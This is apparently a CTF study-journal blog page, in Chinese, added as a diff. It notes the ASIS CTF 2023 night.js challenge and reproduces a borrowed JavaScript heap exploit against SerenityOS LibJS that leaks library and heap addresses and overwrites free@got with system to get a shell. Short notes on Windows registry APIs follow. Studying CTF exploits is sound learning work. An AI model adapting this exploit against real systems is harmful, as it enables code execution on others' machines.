@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>giacomo&#39;s journal</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+    <script src="https://unpkg.com/highlightjs-copy/dist/highlightjs-copy.min.js"></script>
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css">
+    <link
+    rel="stylesheet"
+    href="https://unpkg.com/highlightjs-copy/dist/highlightjs-copy.min.css"
+    />
+    <script>hljs.highlightAll();</script>
+    <script>hljs.addPlugin(new CopyButtonPlugin());</script>
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/js/jquery-3.7.1.min.js"></script>
+
+    
+<script src="/js/bootstrap-transition.js"></script>
+
+    
+<script src="/js/zoom.js"></script>
+
+
+    <style>
+        .markdown-body {
+            box-sizing: border-box;
+            min-width: 200px;
+            max-width: 980px;
+            margin-left: 28%;
+            margin-top: 6%;
+
+            padding: 45px;
+        }
+
+        @media (max-width: 767px) {
+            .markdown-body {
+                padding: 15px;
+            }
+        }
+    </style>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+    <header class="header">
+
+    <div class="navbar-left">
+        <div class="avatar">
+            <a href="/">
+                <img src="https://91ac0m0.github.io/img/avatar.jpg"alt="avatar">
+            </a>
+        </div>
+        <div class="nav-title">
+            <a class="nav-brand" href="/">giacomo</a>
+        </div>
+    </div>
+    <div class="navbar-right">
+        <ul class="nav-links">
+            
+                <div class="nav-link">
+                    <a href="/about" class="menu-item-link">
+                        about
+                    </a>
+                </div>
+            
+        </ul>
+
+    </div>
+    
+
+</header>
+
+    <div class = "toc_left">
+	
+    <div id="toc">
+        <!-- <strong class="sidebar-title">目录</strong> -->
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Nightjs"><span class="toc-text">Nightjs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#File-to-short"><span class="toc-text">File to short</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E4%B8%80%E4%B8%AA-cpp-%E7%9A%84%E5%B0%8F%E4%B8%9C%E8%A5%BF"><span class="toc-text">写一个 cpp 的小东西</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Winapi-%E5%87%BD%E6%95%B0%E5%90%8E%E7%BC%80"><span class="toc-text">Winapi 函数后缀</span></a></li></ol>
+    </div>
+
+</div>
+<article class="markdown-body">
+	<div></div><h2 id="Nightjs"><a href="#Nightjs" class="headerlink" title="Nightjs"></a>Nightjs</h2><p><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/pathlib.html">pathlib</a> 文件系统路径，支持多平台</p>
+<h3 id="File-to-short"><a href="#File-to-short" class="headerlink" title="File to short"></a>File to short</h3><p>可能是没有权限</p>
+<pre><code class="bash">root@594f7280f663:/home/pwn# LD_LIBRARY_PATH=/libjs/ timeout 3 ./js
+./js: error while loading shared libraries: /libjs/liblagom-js.so.0: file too short
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://github.com/sajjadium/ctf-archives/blob/a7ddcef72a666bab10162fc4f9a356a49797592d/ctfs/ASIS/2023/Quals/pwn/night_js/chall.patch">有一个git diff结果文件</a></p>
+<p>原版在这里  <a target="_blank" rel="noopener" href="https://github.com/SerenityOS/serenity/blob/master/Userland/Utilities/js.cpp">serenity&#x2F;Userland&#x2F;Utilities&#x2F;js.cpp 看不懂cpp</a></p>
+<p>偷来 crazyman 的 wp</p>
+<pre><code class="js">buffer_array = []
+spray_array = []
+
+// for(let i = 0; i &lt; 0x10; i++) &#123;
+//     spray_array.push(new ArrayBuffer(0x50))
+// &#125;
+
+for(let i = 0; i &lt; 0x30; i++) &#123;
+    // spray_array.push(new ArrayBuffer(0x50))
+    buffer_array.push(new ArrayBuffer(0x120))
+&#125;
+buffer = buffer_array[0x1f]
+view = new BigUint64Array(buffer)
+
+view[0] = 0n;
+view[1] = 1n;
+view[2] = 2n;
+view[3] = 3n;
+view[4] = 0x100n;
+view[5] = 1n;
+view[6] = 1n;
+
+buffer2 = buffer.transfer(0x20)
+console.log(buffer2.byteLength)
+
+for(let i = 0; i &lt; 0x30; i++) &#123;
+    spray_array.push(new ArrayBuffer(0x160))
+&#125;
+for(let i = 0; i &lt; 0x30; i++) &#123;
+    v = new BigUint64Array(spray_array[i])
+    v[0] = 16653634245063215n
+&#125;
+view2 = new BigUint64Array(buffer2)
+liblagomjsbase = view2[8]-0x67dda8n
+heapbase = view2[10]
+console.log(&quot;leak liblagom-js: &quot;+view2[8].toString(16))
+console.log(&quot;leak heap: &quot;+heapbase.toString(16))
+
+view2[16] = liblagomjsbase
+// test arbitrary read
+v = new BigUint64Array(spray_array[0])
+console.log(v[0].toString(16))
+
+freegot = liblagomjsbase+0x69b420n
+view2[16] = freegot
+libcbase = v[0]-0xa8780n
+system = libcbase+0x55230n
+console.log(freegot.toString(16))
+console.log(libcbase.toString(16))
+
+v[0] = system; //libcbase+0x1105f2n // overwrite free@got in liblagom-js
+view[0] = 0n;
+view[1] = 1n;
+view[2] = 2n;
+view[3] = 3n;
+view[4] = 0x100n;
+view[5] = 1n;
+view[6] = 1n;
+
+// spray_array = vshell
+view2[16] = libcbase+0x1c040cn//l29400045130965551n
+
+
+shell = new ArrayBuffer(0x1000)
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/po6ix/c4039fac5974cea2d3f246d18fa312fd">Asis CTF 2023 - night.js exploit</a></p>
+<p>冲浪发现学长 blog  <a target="_blank" rel="noopener" href="https://a1ex.online/2021/09/27/TCTF-final-Promise-JSpwn%E9%A2%98%E8%A7%A3/">TCTF-final-Promise-JSpwn题解 | A1ex’s Blog</a></p>
+<h2 id="写一个-cpp-的小东西"><a href="#写一个-cpp-的小东西" class="headerlink" title="写一个 cpp 的小东西"></a>写一个 cpp 的小东西</h2><p>想写一个修改注册表的小玩意，但是 <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows/win32/api/winreg/">winapi</a> 的那些名词不清不楚的，直到看到了这个才明白</p>
+<p><img src="https://s4.51cto.com/attachment/201012/025303520.jpg"></p>
+<p>如果有 <code>ERROR_ACCESS_DENIED </code> 那就是没用管理员身份运行</p>
+<p>写好了 commandline 的格式，感觉不如直接写 reg 文件…</p>
+<h2 id="Winapi-函数后缀"><a href="#Winapi-函数后缀" class="headerlink" title="Winapi 函数后缀"></a>Winapi 函数后缀</h2><ul>
+<li>A 表示使用 ANSI 编码作为标准输入与输出流的文本编码</li>
+<li>W表示使用Unicode作为编码</li>
+<li>Ex表示拓展, 标注了Ex的winapi函数会比没有标Ex的函数多一些参数什么的, 可以说拓展了一些功能</li>
+<li>ExA 与 ExW 就是 A,W与Ex的结合了</li>
+</ul>
+</div>
+</article>
+
+<script src="/js/image_pop_up.js"></script>
+
+	
+
+</body>
+</html>
